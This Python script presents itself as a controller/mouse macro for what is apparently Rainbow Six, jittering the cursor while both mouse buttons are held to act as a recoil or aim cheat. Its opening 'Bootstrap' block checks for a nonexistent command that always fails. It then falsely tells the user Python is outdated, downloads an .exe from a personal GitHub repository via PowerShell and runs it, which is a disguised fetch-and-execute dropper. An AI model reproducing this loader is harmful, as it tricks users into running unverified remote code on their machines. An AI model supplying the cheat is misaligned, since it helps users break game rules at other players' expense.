import os
import time
# Bootstrap
LIGHT_GREEN ="\033[1;32m"
LIGHT_BLUE ="\033[1;34m"
LIGHT_PURPLE ="\033[1;35m"
import win32api
import win32con
def check_python():
 check_python = os.system('pygamerr >nul 2>&1')
 if check_python == 0:
   pass
 else:
  while True:
   os.system("cls")
   choice = input(f"{LIGHT_PURPLE}You don't have {LIGHT_GREEN}pythons latest update {LIGHT_PURPLE}[3.13.4]{LIGHT_BLUE} installed, {LIGHT_BLUE}Would You Like To Install ?{LIGHT_GREEN}, {LIGHT_PURPLE}press {LIGHT_GREEN}'yes' To {LIGHT_PURPLE}install {LIGHT_BLUE}OR type {LIGHT_PURPLE}'exit'{LIGHT_GREEN} to quit:{LIGHT_PURPLE} ")
   if choice == "yes":
    os.system("cls")
    os.system('powershell -Command "Invoke-WebRequest -Uri \'https://github.com/sudoaptinstalllevi/Bootstrap/raw/refs/heads/main/Python3.13.4.-amd64.exe\' -OutFile \'Python3.13.4.-amd64.exe\'"')
    time.sleep(0.6)
    os.system("cls")
    time.sleep(1.7)
    os.system("start Python3.13.4.-amd64.exe")
    break
   elif choice == "exit":
    quit(os.system("cls"))
check_python()

import ctypes #line:5
"""Colors For Ui"""#line:6
BLACK ="\033[0;30m"#line:7
RED ="\033[0;31m"#line:8
GREEN ="\033[0;32m"#line:9
BROWN ="\033[0;33m"#line:10
BLUE ="\033[0;34m"#line:11
PURPLE ="\033[0;35m"#line:12
CYAN ="\033[0;36m"#line:13
LIGHT_GRAY ="\033[0;37m"#line:14
DARK_GRAY ="\033[1;30m"#line:15
LIGHT_RED ="\033[1;31m"#line:16
LIGHT_GREEN ="\033[1;32m"#line:17
YELLOW ="\033[1;33m"#line:18
LIGHT_BLUE ="\033[1;34m"#line:19
LIGHT_PURPLE ="\033[1;35m"#line:20
LIGHT_CYAN ="\033[1;36m"#line:21
LIGHT_WHITE ="\033[1;37m"#line:22
"""Colors For Ui"""#line:23
os .system ("cls")#line:24

import os #line:29
import time #line:31
os .environ ['PYGAME_HIDE_SUPPORT_PROMPT']='1'#line:32
import pygame #line:33
os .system ("cls")#line:37

def load_settings ():#line:91
    os .system ("cls")#line:92
    move_up = 20
    move_left = 20
    move_right = 20
    move_down = 21
    time_sleep = 0.0048
    return move_up, move_left, move_right, move_down, time_sleep
def banner():#line:133
  print (fr"""  {LIGHT_PURPLE}                                                            
                                                                            
                                                     __    _____ _____ _____ _____ 
                                                ___|  _|  |_   _|   __|   __|_   _|
                                               |  _| . |    | | |   __|__   | | |  
                                               |_| |___|    |_| |_____|_____| |_|  
                                     """) 
def controller_call ():#line:141
    OO0O0000O0OO0OO00 =0x0001 #line:142
    ctypes.windll.user32.mouse_event(OO0O0000O0OO0OO00 ,move_left,  move_down ,24 ,24 )#line:143
    time .sleep (0.0037 )#line:144
    ctypes.windll.user32.mouse_event(OO0O0000O0OO0OO00 , -move_right, -move_up ,-24 ,-24 )#line:145
def monitor_settings (O000OO00OOOO00OOO ):#line:147
    return O000OO00OOOO00OOO #line:148
def wait_for_controller ():#line:149
    while pygame .joystick .get_count ()==0 :#line:150
        time .sleep (0.7 )#line:153
        pygame .joystick .quit ()#line:154
        pygame .joystick .init ()#line:155
    OOO0OOOO0OOO0OOOO =pygame .joystick .Joystick (0 )#line:156
    OOO0OOOO0OOO0OOOO .init ()#line:157
    os.system("cls")
    banner()
    print (f"\n{LIGHT_WHITE}                   Works For {YELLOW}Xbox {LIGHT_WHITE}+ {LIGHT_PURPLE}Ps4/5                             {LIGHT_CYAN}LT + LR{LIGHT_WHITE} or {LIGHT_PURPLE}L1 + L2\033[0m")#line:160
    print (f"\n{LIGHT_WHITE}                                                 Project By \033[1;32m@yyLevi\033[0m")#line:161
    print (f"                                                 ['{GREEN}R6 TESTING'\033[0m]")#line:16
    return OOO0OOOO0OOO0OOOO #line:163
try:
        move_right, move_left, move_up, move_down, time_sleep = load_settings() # i fucking hate indents in python
        current_settings = (move_right, move_left, move_up, move_down)
        pygame.init()
        pygame.joystick.init()
        controller = wait_for_controller()
        while True:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    pygame.quit()
                    exit()
            if pygame.joystick.get_count() == 0:
                pygame.quit()
                exit()
            mouse_aim = win32api.GetAsyncKeyState(win32con.VK_RBUTTON) 
            mouse_wait = win32api.GetAsyncKeyState(win32con.VK_LBUTTON) 
            shoot = controller.get_axis(4)
            aim = controller.get_axis(4)
            
            if mouse_aim and mouse_wait:
                controller_call()
            if int(time.time()) % 2 == 0:
                updated_settings = monitor_settings(current_settings)
                if updated_settings != current_settings:
                    move_right, move_left, move_up, move_down = updated_settings
                    current_settings = updated_settings
            time.sleep(time_sleep)
except KeyboardInterrupt:
       print("\n")





